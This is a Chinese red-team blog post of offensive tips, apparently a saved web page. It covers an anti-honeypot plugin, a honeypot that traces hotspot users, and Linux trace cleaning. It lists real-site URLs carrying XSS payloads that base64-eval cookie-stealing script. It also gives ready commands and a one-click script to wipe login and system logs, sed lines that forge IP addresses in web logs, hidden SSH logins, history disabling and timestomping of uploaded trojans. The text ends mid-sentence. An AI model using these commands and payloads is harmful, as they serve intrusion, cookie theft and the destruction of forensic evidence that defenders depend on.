<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="mes9s0">
    
    <title>
        
            没用的小技巧(RED) |
        
        Mes9s0&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/biaoti.jpeg">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/css/font-awesome.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"};
    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/xiaoxin.jpeg","favicon":"/images/biaoti.jpeg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"只是希望进步而已."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"mac"},"pjax":{"enable":false},"lazyload":{"enable":true},"version":"3.4.5"};
    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
  </script>
<meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="CaiJiang's Blog" type="application/atom+xml">
</head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                Mes9s0&#39;s Blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                首页
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                归档
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                分类
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                标签
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/links"
                            >
                                友链
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                关于
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">首页</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">归档</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">分类</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">标签</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/links">友链</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">关于</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="article-content-container">

        <div class="article-title">
            <span class="title-hover-animation">没用的小技巧(RED)</span>
        </div>

        
            <div class="article-header">
                <div class="avatar">
                    <img src="/images/xiaoxin.jpeg">
                </div>
                <div class="info">
                    <div class="author">
                        <span class="name">mes9s0</span>
                        
                            <span class="author-label">Lv3</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fas fa-edit"></i>&nbsp;
        <span class="pc">2022-08-07 22:40:56</span>
        <span class="mobile">2022-08-07 22:40</span>
    </span>
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/%E7%BA%A2%E8%89%B2tips/">红色tips</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/%E5%85%B6%E4%BB%96/">其他</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/%E9%98%B2%E6%BA%AF%E6%BA%90/">防溯源</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/">痕迹清理</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>8.1k 字</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>37 分钟</span>
        </span>
    
    
</div>

                    </div>
                </div>
            </div>
        

        <div class="article-content markdown-body">
            <h3 id="防蜜罐插件"><a href="#防蜜罐插件" class="headerlink" title="防蜜罐插件"></a>防蜜罐插件</h3><p>​    蜜罐：</p>
<p>​    1.配置jsonp接口信息</p>
<p>​    2.配置蜜罐网站信息</p>
<p>​            仿站(提供目标站点扒取页面静态文件,功能无法正常使用)</p>
<p>​            二次修改后的源码(功能可用正常使用,但是所有数据全部为假数据,或者是精简以后的源码)</p>
<p>​    3.等待踩蜜罐</p>
<p>​    在配置蜜罐阶段的时候，其实就会将已经配置好的jsonp接口所生成的js文件(固定|动态)URL,插入到蜜罐中的静态文件里面.以此来达到只要你打开蜜罐网站,那么js将会自动加载并且执行调用所有jsonp接口的数据,然后将数据返回至后端.</p>
<p>​    插件原理：判断网站域与jsonp接口请求的域是否是一个.</p>
<p>​    地址：<a class="link"   target="_blank" rel="noopener" href="https://github.com/cnrstar/anti-honeypot" >https://github.com/cnrstar/anti-honeypot<i class="fas fa-external-link-alt"></i></a></p>
<hr>
<h3 id="一种针对热点的蜜罐"><a href="#一种针对热点的蜜罐" class="headerlink" title="一种针对热点的蜜罐"></a>一种针对热点的蜜罐</h3><p>​    <strong>这个蜜罐的溯源方式针对使用手机热点的红队人员。蜜罐直接获取攻击者手机号进行溯源。一抓一个准。各位红队人员小心为妙。</strong></p>
<p>​    首先打开网站，他会监控是否开启了F12控制台，如果开启了调试模式的话，溯源代码会停止加载。</p>
<p>​    另外，针对使用burp的用户。小心你们的burp版本是否存在chrome的漏洞。</p>
<p>​    沙箱的特征如下，直接加载js</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074228.jpg"
                      alt="image"
                ></p>
<p>​    fofa上面可以直接搜索到142多条</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074229.jpg"
                      alt="image"
                ></p>
<p>​    重点获取手机号js代码，可以看到会获取三大运营商的手机信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074230.jpg"
                      alt="image"
                ></p>
<p>​    解密如下</p>
<p>​    获取联通的接口</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074232.jpg"
                      alt="image"
                ></p>
<p>​    如果获取到手机号码的话，会将加密的手机号上传</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-74233.jpg"
                      alt="image"
                ></p>
<p>​    另外其他溯源接口如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">https://access.video.qq.com/trans/pay.video.qq.com/fcgi-bin/payvip?vappid=68106135&amp;vsecret=e667570eb833960cc41051d498df1c233308eb195dba2cc3&amp;getannual=1&amp;geticon=1&amp;getsvip=1&amp;otype=json&amp;callback=jQuery19104991404611435173_1562551736901&amp;uin=a&amp;t=1&amp;getadpass=0&amp;g_tk=a&amp;g_vstk=a&amp;g_actk=&amp;_=15625517369020.4515320024420155</span><br><span class="line"></span><br><span class="line">https://bbs.zhibo8.cc/user/userinfo?device=pc&amp;_=1584613345023&amp;callback=jcbDNoDtQbW&amp;callback=callback_165893378313192912</span><br><span class="line"></span><br><span class="line">https://myjr.suning.com/sfp/mutualTrust/getLoginInfo.htm?callback=getphone</span><br><span class="line"></span><br><span class="line">https://myjr.suning.com/sfp/headPic/getEgoMemberHeadPicUrl.htm</span><br><span class="line"></span><br><span class="line">https://ajax.58pic.com/58pic/index.php?m=adManageSystem&amp;a=showAdDeliveryForPosition&amp;callback=%3Cscript%3Eeval(atob(%27ZnVuY3Rpb24gZ2V0Q29va2llKG5hbWUpIAp7IAogICAgdmFyIGFycixyZWc9bmV3IFJlZ0V4cCgiKF58ICkiK25hbWUrIj0oW147XSopKDt8JCkiKTsKIAogICAgaWYoYXJyPWRvY3VtZW50LmNvb2tpZS5tYXRjaChyZWcpKQogCiAgICAgICAgcmV0dXJuIGRlY29kZVVSSUNvbXBvbmVudChhcnJbMl0pOyAKICAgIGVsc2UgCiAgICAgICAgcmV0dXJuIG51bGw7IAp9CndpbmRvdy5wYXJlbnQucG9zdE1lc3NhZ2UoeyJuYW1lIjoicWlhbnR1IiwiZGF0YSI6eyJ1aWQiOmdldENvb2tpZSgicXRfdWlkIil9fSwnKicpOw==%27))%3C/script%3E&amp;position=31&amp;keyword=XXX&amp;_=1590829943379</span><br><span class="line"></span><br><span class="line">https://my.zol.com.cn/public_new.php</span><br><span class="line"></span><br><span class="line">https://access.video.qq.com/trans/pay.video.qq.com/fcgi-bin/payvip?vappid=68106135&amp;vsecret=e667570eb833960cc41051d498df1c233308eb195dba2cc3&amp;getannual=1&amp;geticon=1&amp;getsvip=1&amp;otype=json&amp;callback=jQuery19104991404611435173_1562551736901&amp;uin=a&amp;t=1&amp;getadpass=0&amp;g_tk=a&amp;g_vstk=a&amp;g_actk=&amp;_=15625517369020.04630644674906281</span><br><span class="line"></span><br><span class="line">https://access.video.qq.com/trans/pay.video.qq.com/fcgi-bin/payvip?vappid=68106135&amp;vsecret=e667570eb833960cc41051d498df1c233308eb195dba2cc3&amp;getannual=1&amp;geticon=1&amp;getsvip=1&amp;otype=json&amp;callback=jQuery19104991404611435173_1562551736901&amp;uin=a&amp;t=1&amp;getadpass=0&amp;g_tk=a&amp;g_vstk=a&amp;g_actk=&amp;_=15625517369020.38244545320223655</span><br><span class="line"></span><br><span class="line">http://my.zol.com.cn/public_new.php</span><br><span class="line"></span><br><span class="line">https://loginst.suning.com/authStatus?callback=getuid</span><br><span class="line"></span><br><span class="line">https://www.fhyx.com/account/login.html?redirecturl=%22%3E%3CSCrIpT%3Eeval(atob(unescape(location.hash.slice(1))))%3C/SCrIpT%3E</span><br><span class="line"></span><br><span class="line">https://so.u17.com/all/%22%3C/span%3E%250a%3Cimg%2520src=1%20onerror=%22document.body.innerHTML=location.search;document.body.innerHTML=document.body.innerText;%22%3E%250a%22/m0_p1.html?&amp;lt;img/src=&amp;quot;x&amp;quot;/onerror=a=eval;a(atob(unescape(location.hash.slice(1))))&amp;gt;</span><br><span class="line"></span><br><span class="line">https://i.vip.iqiyi.com/client/store/pc/checkout.action?platform=b6c13e26323c537d&amp;fs=&amp;fsSign=&amp;fc=&amp;fv=&amp;qc005=&amp;P00001=&amp;pid=adb3376b039b970b&amp;vipType=2&amp;aid=&amp;device_id=&amp;callback=callback_165893378307001282</span><br><span class="line"></span><br><span class="line">https://login.sina.com.cn/sso/login.php?client=&amp;service=&amp;client=&amp;encoding=&amp;gateway=1&amp;returntype=TEXT&amp;useticket=0&amp;callback=sina2&amp;_=1577938268947&amp;callback=callback_165893378307919803</span><br><span class="line"></span><br><span class="line">https://v-api-plus.huya.com/jsapi/getUserInfo?callback=jQuery1111007865243652615272_1628490347897&amp;_=1628490347898&amp;callback=callback_165893378306693233</span><br><span class="line"></span><br><span class="line">http://mapp.jrj.com.cn/pc/content/getMqNews?vname=%3Csvg%20onload=eval(atob(%27ZnVuY3Rpb24gZ2V0Q29va2llKG5hbWUpIAp7IAogICAgdmFyIGFycixyZWc9bmV3IFJlZ0V4cCgiKF58ICkiK25hbWUrIj0oW147XSopKDt8JCkiKTsKIAogICAgaWYoYXJyPWRvY3VtZW50LmNvb2tpZS5tYXRjaChyZWcpKQogCiAgICAgICAgcmV0dXJuIGRlY29kZVVSSUNvbXBvbmVudChhcnJbMl0pOyAKICAgIGVsc2UgCiAgICAgICAgcmV0dXJuIG51bGw7IAp9CndpbmRvdy5wYXJlbnQucG9zdE1lc3NhZ2UoeyJuYW1lIjoianJqIiwiZGF0YSI6eyJ1aWQiOmdldENvb2tpZSgibXlqcmpfdXNlcmlkIil9fSwnKicpOw==%27))%3E</span><br><span class="line"></span><br><span class="line">https://www.ixueshu.com/index.html?v=1608893853571&amp;template=sys_login_ajax.html&amp;_url=123123123%22%22%3E%3CsCrIpT%3Eeval(atob(unescape(location.hash.slice(1))))%3C/sCrIpT%3E</span><br><span class="line"></span><br><span class="line">https://hackit.me/v.qq.com/</span><br><span class="line"></span><br><span class="line">https://api.csdn.net/oauth/authorize?client_id=1000001&amp;redirect_uri=http://www.iteye.com/auth/csdn/callback&amp;response_type=%22https%3A%2F%2Fapi.csdn.net%2Foauth%2Fauthorize%3Fclient_id%3D1000001%26redirect_uri%3Dhttp%3A%2F%2Fwww.iteye.com%2Fauth%2Fcsdn%2Fcallback%26response_type%3D%22%3E%3Cimg%20src%3Dx%20onerror%3Deval(window.name)%3E</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Linux痕迹清理"><a href="#Linux痕迹清理" class="headerlink" title="Linux痕迹清理"></a>Linux痕迹清理</h3><p>​     <strong>#管理员   $普通用户   /表示根目录   ~表示当前用户家目录</strong></p>
<h4 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h4><table>
<thead>
<tr>
<th>命令</th>
<th>日志文件</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>w,who</td>
<td>/var/run/utmp</td>
<td>记录当前正在登录系统的用户信息，uptime记录系统启动时间</td>
</tr>
<tr>
<td>last</td>
<td>/var/log/wtmp</td>
<td>所有成功登录/登出的历史记录</td>
</tr>
<tr>
<td>lastb</td>
<td>/var/log/btmp</td>
<td>登录失败尝试</td>
</tr>
<tr>
<td>lastlog</td>
<td>/var/log/lastlog</td>
<td>最近登录记录</td>
</tr>
</tbody></table>
<p>​    这些日志都是以二进制形式存储。</p>
<table>
<thead>
<tr>
<th><strong>日志</strong></th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>/var/log/secure</td>
<td>记录与安全相关的日志信息，涉及使用账户和密码登录的程序都会记录</td>
</tr>
<tr>
<td>/var/log/auth.log</td>
<td>需要身份确认的操作</td>
</tr>
<tr>
<td>/var/log/messages</td>
<td>记录系统启动后的信息和错误日志</td>
</tr>
<tr>
<td>/var/log/cron</td>
<td>记录定时任务相关的日志信息</td>
</tr>
<tr>
<td>/var/log/spooler</td>
<td>记录UUCP和news设备相关的日志信息</td>
</tr>
<tr>
<td>/var/log/boot.log</td>
<td>记录守护进程启动和停止相关的日志消息</td>
</tr>
</tbody></table>
<h5 id="清除方法"><a href="#清除方法" class="headerlink" title="清除方法"></a>清除方法</h5><h6 id="方案一直接清空："><a href="#方案一直接清空：" class="headerlink" title="方案一直接清空："></a>方案一直接清空：</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; /var/log/utmp</span><br><span class="line">&gt; /var/log/wtmp</span><br><span class="line">&gt; /var/log/btmp</span><br><span class="line">&gt; /var/log/lastlog</span><br></pre></td></tr></table></figure>

<p>​    不留下任何痕迹，但是特征也很明显，容易被察觉，一般不推荐使用。将日志文件全部删除即将空字符写入日志文件，需要root权限，有五种命令可以实现：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /dev/null &gt; filename</span><br><span class="line">: &gt; filename</span><br><span class="line">&gt; filename</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; filename</span><br><span class="line"><span class="built_in">echo</span> &gt; filename</span><br></pre></td></tr></table></figure>

<p>​    区别：前三种命令清空文件后文件大小为0，后两种命令清空文件后会留下一个换行符，文件大小为1byte。</p>
<h6 id="方案二部分删除："><a href="#方案二部分删除：" class="headerlink" title="方案二部分删除："></a>方案二部分删除：</h6><p>​    对于文本格式的日志文件，可以直接进入文件进行删改，也可以利用流编辑命令<code>sed</code>删除文件中匹配的行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除所有匹配到字符串的行，比如自己的登录ip</span></span><br><span class="line">sed -i <span class="string">&#x27;/ip/d&#x27;</span> /var/log/messages</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全局替换登录IP地址：</span></span><br><span class="line">sed -i <span class="string">&#x27;s/ip1/ip2/g&#x27;</span> /var/log/auth.log</span><br></pre></td></tr></table></figure>

<p>​    对于二进制日志文件，部分删除需要使用<code>utmpdump</code>命令，<code>utmpdump</code>可以将wtmp和utmp转换为文本文件，将文本文件编辑修改后恢复成二进制文件即可，如下面针对wtmp进行修改：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将二进制日志文件转换为可编辑的文本文件</span></span><br><span class="line">utmpdump /var/log/wtmp &gt;/var/log/wtmp.file</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对文本文件进行编辑和修改</span></span><br><span class="line"><span class="comment"># 将编辑修改后的文本文件转换为二进制日志文件</span></span><br><span class="line">utmpdump -r &lt; /var/log/wtmp.file &gt; /var/log/wtmp</span><br></pre></td></tr></table></figure>

<h6 id="方案三隐藏登陆："><a href="#方案三隐藏登陆：" class="headerlink" title="方案三隐藏登陆："></a>方案三隐藏登陆：</h6><p>​    从应用层面通过参数选择隐藏记录，如ssh远程隐藏登录：</p>
<p>​    登录时不分配伪终端，不会记录在utmp、wtmp、btmp中，不会被w、who、users、last、lastb命令发现：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -T root@192.168.126.1 /bin/bash -i</span><br><span class="line"><span class="comment"># -T：不分配伪终端</span></span><br><span class="line"><span class="comment"># -i：bash的参数，表示交互式shell</span></span><br></pre></td></tr></table></figure>

<p>​    登录时不将ssh公钥保存在本地<code>.ssh</code>目录中：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -o UserKnownHostsFile=/dev/null -T root@192.168.126.2 /bin/bash –i</span><br><span class="line"><span class="comment"># -o：options选择信息</span></span><br></pre></td></tr></table></figure>

<p><strong>注：使用<code>ps</code>命令可以查看到ssh隐藏登录的进程</strong></p>
<h4 id="History记录"><a href="#History记录" class="headerlink" title="History记录"></a>History记录</h4><p>​    查看历史操作命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">history</span></span><br></pre></td></tr></table></figure>

<p>​    history显示<strong>内存和~/.bash_history中的所有内容</strong>；</p>
<p>​    内存中的内容并没有立刻写入~/.bash_history，只有当当前shell关闭时才会将内存内容写入shell。</p>
<h5 id="清除history历史命令记录"><a href="#清除history历史命令记录" class="headerlink" title="清除history历史命令记录"></a><strong>清除history历史命令记录</strong></h5><p>​    1、编辑history记录文件，删除部分不想被保存的历史命令。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bash_history</span><br></pre></td></tr></table></figure>

<p>​    2、清除当前用户的history命令记录。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">history</span> -c  <span class="comment"># 删除内存中的所有命令历史</span></span><br><span class="line"><span class="built_in">history</span> -r  <span class="comment"># 删除当前会话历史记录</span></span><br></pre></td></tr></table></figure>

<p>​    3、利用vim特性删除历史命令。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="comment">#使用vim打开一个文件vi test.txt# 设置vim不记录命令，Vim会将命令历史记录，保存在viminfo文件中。:set history=0# 用vim的分屏功能打开命令记录文件.bash_history，编辑文件删除历史操作命令：vsp ~/.bash_history# 清楚保存.bash_history文件即可。</span></span><br></pre></td></tr></table></figure>

<p>​    4、在vim中执行自己不想让别人看到的命令。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:<span class="built_in">set</span> <span class="built_in">history</span>=0</span><br><span class="line">:!<span class="built_in">command</span></span><br></pre></td></tr></table></figure>

<p>​    特别的可以运行**:!bash<strong>来启动一个bash shell并执行命令，不需要退出vim（最后还要删除VIM所产生的日志文件噢，kali里面是</strong>.viminfo<strong>，在vim中使用</strong>rm -rf**强制清除）。</p>
<h5 id="不记录history历史命令"><a href="#不记录history历史命令" class="headerlink" title="不记录history历史命令"></a>不记录history历史命令</h5><p>​    1、通过修改配置文件/etc/profile，使系统不再保存命令记录。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HISTSIZE=0</span><br></pre></td></tr></table></figure>

<p>​    2、登录后执行下面命令,不记录历史命令(.bash_history)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">unset</span> HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG;</span><br><span class="line"><span class="built_in">export</span> HISTFILE=/dev/null;</span><br><span class="line"><span class="built_in">export</span> HISTSIZE=0;</span><br><span class="line"><span class="built_in">export</span> HISTFILESIZE=0</span><br></pre></td></tr></table></figure>

<h4 id="一键清除history和系统日志脚本"><a href="#一键清除history和系统日志脚本" class="headerlink" title="一键清除history和系统日志脚本"></a>一键清除history和系统日志脚本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/syslog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/messages</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/httpd/access_log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/httpd/error_log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/xferlog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/secure</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/auth.log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/user.log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/wtmp</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/lastlog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/btmp</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/run/utmp</span><br><span class="line"><span class="built_in">rm</span> ~/./bash_history</span><br><span class="line"><span class="built_in">history</span> -c</span><br></pre></td></tr></table></figure>

<h4 id="清除web日志痕迹"><a href="#清除web日志痕迹" class="headerlink" title="清除web日志痕迹"></a>清除web日志痕迹</h4><p>​    web日志同样可以使用sed进行伪造，例如apache日志、MySQL日志、php日志</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> –i /var/log/apache/access.log</span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> –i /var/log/apache/error_log</span><br><span class="line"></span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> –i /var/log/mysql/mysql_error.log</span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> –i /var/log/mysql/mysql_slow.log</span><br><span class="line"></span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/192.168.1.4/g&#x27;</span> –i /var/log/apache/php_error.log</span><br></pre></td></tr></table></figure>

<p>​    清除部分相关日志：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用grep -v来把我们的相关信息删除</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/nginx/access.log | grep -v evil.php &gt; tmp.log</span><br><span class="line"><span class="comment"># 把修改过的日志覆盖到原日志文件</span></span><br><span class="line"><span class="built_in">cat</span> tmp.log &gt; /var/log/nginx/access.log/</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Linux文件伪装"><a href="#Linux文件伪装" class="headerlink" title="Linux文件伪装"></a>Linux文件伪装</h3><h4 id="伪装与隐藏"><a href="#伪装与隐藏" class="headerlink" title="伪装与隐藏"></a>伪装与隐藏</h4><h5 id="修改时间戳"><a href="#修改时间戳" class="headerlink" title="修改时间戳"></a>修改时间戳</h5><p>​    Linux文件时间戳包括三种，用stat filename命令查看：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">访问时间(access time，atime)：文件内容最后一次被读取的时间，如用<span class="built_in">cat</span>、more命令查看文件</span><br><span class="line">修改时间(modify time，mtime)：文件内容最后一次被修改的时间，如用vim编辑器修改文件内容</span><br><span class="line">改变时间(change time，ctime)：文件属性被最后一次被修改的时间，inode节点信息被修改时间（大小、属组、属主、权限），如用<span class="built_in">chmod</span>、<span class="built_in">chown</span>命令修改文件属性，或修改文件内容</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074234.jpg"
                      alt="image-20220825213233277"
                ></p>
<p>​    <code>ls -l</code>命令查看的是文件最后一次被修改的时间mtime。</p>
<p>​    上传工具或木马文件后，要将其修改为和当前目录中文件相近的时间，利用<code>touch</code>命令进行修改atime和mtime（不能修改ctime），命令参数如下</p>
